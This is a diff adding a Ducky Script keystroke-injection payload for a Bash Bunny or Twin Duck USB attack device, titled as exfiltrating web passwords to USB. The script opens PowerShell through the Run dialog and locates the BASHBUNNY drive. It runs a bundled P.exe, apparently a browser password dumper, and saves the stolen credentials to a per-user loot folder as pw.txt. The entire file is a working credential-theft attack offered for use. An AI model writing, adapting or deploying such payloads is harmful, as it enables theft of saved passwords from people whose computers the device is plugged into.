@@ -1,0 +1,41 @@
+REM Exfiltrate Web passwords to usb, bashbunny, or twinduck
+REM Created By : Blue Cosmo
+
+REM let computer recognize twinduck
+DELAY 1000
+
+REM open powershell via runbox
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+
+REM cd into drive labeled "BASHBUNNY", add path to clipboard
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BASHBUNNY'}|select name;cd $u.name
+ENTER
+DELAY 200
+STRING mkdir loot\$env:UserName
+ENTER
+DELAY 200
+STRING cd .\payloads\switch1\  
+ENTER
+DELAY 200
+STRING $u.name+"loot\"+$env:UserName | clip
+ENTER
+
+REM run "P.exe" and save creds to drive
+DELAY 100
+STRING ./P.exe; exit
+ENTER
+DELAY 3000
+CTRL a
+CTRL s
+DELAY 200
+STRING pw.txt
+ALT d
+CTRL v
+ENTER
+ALT s
+DELAY 100
+ALT F4
